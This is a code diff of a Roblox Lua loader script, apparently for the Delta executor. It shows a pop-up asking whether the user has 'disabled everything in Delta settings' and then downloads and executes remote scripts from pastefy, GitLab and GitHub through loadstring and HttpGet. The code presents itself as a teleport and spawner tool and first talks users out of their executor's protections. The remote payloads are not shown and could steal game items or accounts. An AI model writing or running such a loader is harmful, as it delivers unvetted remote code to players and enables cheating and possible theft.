@@ -1,14 +1,17 @@
+--// Loader Script (Warning -> TP -> Spawner)
+
 --// Services
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
---// Remove old GUI if exists
-if PlayerGui:FindFirstChild("DeltaWarningGUI") then
-    PlayerGui:FindFirstChild("DeltaWarningGUI"):Destroy()
+-- Remove old GUIs
+for _, guiName in pairs({"DeltaWarningGUI", "ConfirmGUI"}) do
+    local oldGui = PlayerGui:FindFirstChild(guiName)
+    if oldGui then oldGui:Destroy() end
 end
 
---// ScreenGui setup
+-- Main Warning GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "DeltaWarningGUI"
 screenGui.ResetOnSpawn = false
@@ -55,57 +58,70 @@ okBtn.Font = Enum.Font.GothamBold
 okBtn.Parent = mainFrame
 Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)
 
---// Confirmation step
+-- Confirmation popup
 okBtn.MouseButton1Click:Connect(function()
-    mainFrame:Destroy()
+    screenGui:Destroy()
 
-    local confirmFrame = Instance.new("Frame")
-    confirmFrame.Size = UDim2.new(0, 360, 0, 150)
-    confirmFrame.Position = UDim2.new(0.5, -180, 0.5, -75)
-    confirmFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
-    confirmFrame.Parent = screenGui
-    Instance.new("UICorner", confirmFrame).CornerRadius = UDim.new(0, 12)
+    local confirmGui = Instance.new("ScreenGui")
+    confirmGui.Name = "ConfirmGUI"
+    confirmGui.ResetOnSpawn = false
+    confirmGui.Parent = PlayerGui
 
-    local confirmText = Instance.new("TextLabel")
-    confirmText.Size = UDim2.new(1, -20, 0, 60)
-    confirmText.Position = UDim2.new(0, 10, 0, 10)
-    confirmText.BackgroundTransparency = 1
-    confirmText.Text = "✅ Did you disable everything in Delta settings?"
-    confirmText.TextColor3 = Color3.fromRGB(255, 255, 200)
-    confirmText.TextWrapped = true
-    confirmText.Font = Enum.Font.GothamBold
-    confirmText.TextSize = 18
-    confirmText.Parent = confirmFrame
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    frame.Parent = confirmGui
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 0, 60)
+    label.Position = UDim2.new(0, 10, 0, 10)
+    label.BackgroundTransparency = 1
+    label.Text = "Did you disable everything in Delta settings?"
+    label.TextWrapped = true
+    label.Font = Enum.Font.Gotham
+    label.TextSize = 16
+    label.TextColor3 = Color3.fromRGB(255,255,255)
+    label.Parent = frame
 
     local yesBtn = Instance.new("TextButton")
-    yesBtn.Size = UDim2.new(0, 120, 0, 40)
-    yesBtn.Position = UDim2.new(0.25, -60, 1, -50)
+    yesBtn.Size = UDim2.new(0.5, -15, 0, 40)
+    yesBtn.Position = UDim2.new(0, 10, 1, -50)
     yesBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
     yesBtn.Text = "Yes"
     yesBtn.TextColor3 = Color3.fromRGB(255,255,255)
     yesBtn.Font = Enum.Font.GothamBold
     yesBtn.TextSize = 18
-    yesBtn.Parent = confirmFrame
-    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 10)
+    yesBtn.Parent = frame
+    Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 8)
 
     local noBtn = Instance.new("TextButton")
-    noBtn.Size = UDim2.new(0, 120, 0, 40)
-    noBtn.Position = UDim2.new(0.75, -60, 1, -50)
+    noBtn.Size = UDim2.new(0.5, -15, 0, 40)
+    noBtn.Position = UDim2.new(0.5, 5, 1, -50)
     noBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
     noBtn.Text = "No"
     noBtn.TextColor3 = Color3.fromRGB(255,255,255)
     noBtn.Font = Enum.Font.GothamBold
     noBtn.TextSize = 18
-    noBtn.Parent = confirmFrame
-    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 10)
+    noBtn.Parent = frame
+    Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 8)
 
+    -- Yes = run TP first time, then Spawner next time
     yesBtn.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
-        -- Directly run your tester.lua script
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ceanimus1627/tester/refs/heads/main/tester.lua"))()
+        confirmGui:Destroy()
+        if not _G.AlreadyTeleported then
+            -- First run → Teleport script
+            _G.AlreadyTeleported = true
+            loadstring(game:HttpGet("https://pastefy.app/ESqWIOfA/raw"))()
+        else
+            -- Second run → Spawner script
+            local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+            Spawner.Load()
+        end
     end)
 
     noBtn.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
+        confirmGui:Destroy()
     end)
 end)
